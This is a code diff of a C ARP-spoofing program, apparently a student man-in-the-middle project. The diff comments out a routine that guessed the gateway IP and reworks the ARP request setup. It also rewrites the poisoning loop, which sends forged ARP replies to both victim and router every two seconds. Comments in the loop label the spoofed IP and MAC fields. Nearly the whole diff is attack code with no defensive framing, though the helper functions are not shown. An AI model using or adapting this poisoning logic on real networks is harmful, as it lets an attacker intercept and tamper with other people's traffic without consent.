@@ -3,6 +3,7 @@
 
 # include <stdio.h>
 # include <stdlib.h>
+#include <string.h>
 # include <unistd.h>
 # include <time.h>
 
@@ -79,25 +80,25 @@ static int raw_socket()
 	return (sock_fd);
 }
 
-static struct in_addr get_access_point_ip(t_session session)
-{
- /*this should be better made but to much for my mental sanity at least for now
-  * The thing is i should be able to know which is the ip of the access point
-  * but the way of knowing is against the norm and against the way im doing this project for using it on man in the middle project
-  * because of course im lazy enough for not doing the same project twice im going to go in deep with c just once :D
-  * but this part is tricky and im not going to do it now, so fucked im going to asssume that the ip is the one that starts with .1 
-  * on docker that works but in other kind of networks thats not always correct for example on 42 the access_point is 10.11.254.254
-  * and of course there is a lot of ways of getting this info but not today baby
-  * in terminal u can see this here :D command -> ip route show default                                                                                                                                                         deordone@car14s4
-  */
-	struct in_addr target_ip;
-
-	target_ip = session.src.ip;	
-	unsigned char *bytes = (unsigned char *)&target_ip.s_addr;
-	bytes[3] = 1;
-
-	return (target_ip);
-}
+// static struct in_addr get_access_point_ip(t_session session)
+// {
+//  /*this should be better made but to much for my mental sanity at least for now
+//   * The thing is i should be able to know which is the ip of the access point
+//   * but the way of knowing is against the norm and against the way im doing this project for using it on man in the middle project
+//   * because of course im lazy enough for not doing the same project twice im going to go in deep with c just once :D
+//   * but this part is tricky and im not going to do it now, so fucked im going to asssume that the ip is the one that starts with .1 
+//   * on docker that works but in other kind of networks thats not always correct for example on 42 the access_point is 10.11.254.254
+//   * and of course there is a lot of ways of getting this info but not today baby
+//   * in terminal u can see this here :D command -> ip route show default                                                                                                                                                         deordone@car14s4
+//   */
+// 	struct in_addr target_ip;
+//
+// 	target_ip = session.src.ip;	
+// 	unsigned char *bytes = (unsigned char *)&target_ip.s_addr;
+// 	bytes[3] = 1;
+//
+// 	return (target_ip);
+// }
 
 static void send_packet(int sock, int index, struct arp_packet *pkt, unsigned char *dest_mac) 
 {
@@ -164,11 +165,14 @@ static void get_access_point_mac(int socket, unsigned int *index, t_session sess
 	if (getifaddrs(&ifaddr) == -1)\
 		error("cannot access mac address of the system");
 
-	first = session;
 	char *name = get_nic(ifaddr);
 	*index = if_nametoindex(name);           
-	access_point->ip = get_access_point_ip(session); 
-	first.dst.ip = access_point->ip;
+	//access_point->ip = session.dst.ip;
+	//access_point->ip = get_access_point_ip(session); 
+	//first.dst.ip = access_point->ip;
+	first.src.ip = session.dst.ip;
+	memcpy(first.dst.mac, session.dst.mac, 6);
+	first.dst.ip = session.src.ip;
 	memset(first.dst.mac, 0, 6);
 	fill_arp_request(first, &pkt, ARPOP_REQUEST);
 	send_packet(socket, *index, &pkt, pkt.eth.h_dest);
@@ -180,7 +184,7 @@ static void get_access_point_mac(int socket, unsigned int *index, t_session sess
 	freeifaddrs(ifaddr);
 }
 
-static void poisoning(int sock, int index, t_session victim_session, t_pair access_point)
+static void poisoning(int sock, int index, t_session session, t_pair access_point)
 {
 	struct arp_packet router_packet;
 	struct arp_packet victim_packet;
@@ -188,8 +192,10 @@ static void poisoning(int sock, int index, t_session victim_session, t_pair acce
 	time_t last_poison = 0;
 	unsigned char buffer[2048];
 
-	router_session = victim_session;
-	router_session.dst.ip = access_point.ip;
+	router_session = session;
+	router_session.src.ip = session.dst.ip;
+	router_session.dst.ip = session.src.ip;
+
 	memcpy(router_session.dst.mac, access_point.mac, 6);
 
 	while(loop)
@@ -197,12 +203,21 @@ static void poisoning(int sock, int index, t_session victim_session, t_pair acce
 		time_t now = time(NULL);
 		if (now - last_poison >= 2)
 		{
-			//POISON ROUTER
+			//POISON VICTIM 
+			//session -> src -> ip victim  
+			//session -> src -> mac attacker 
+			//session -> dst -> ip router  
+			//session -> dst -> mac router 
+			//access_point -> mac victim
+			fill_arp_request(session, &victim_packet, ARPOP_REPLY);
+			send_packet(sock, index, &victim_packet, access_point.mac);
+			//POISON ROUTER 
+			//router_session -> src -> ip router  
+			//router_session -> src -> mac attacker 
+			//router_session -> dst -> ip victim  
+			//router_session -> dst -> mac victim 
 			fill_arp_request(router_session, &router_packet, ARPOP_REPLY);
-			send_packet(sock, index, &router_packet, router_session.dst.mac);
-			//POISON VICTIM
-			fill_arp_request(victim_session, &victim_packet, ARPOP_REPLY);
-			send_packet(sock, index, &victim_packet, victim_session.dst.mac);
+			send_packet(sock, index, &router_packet, session.dst.mac);
 			last_poison = now;
 		}
 
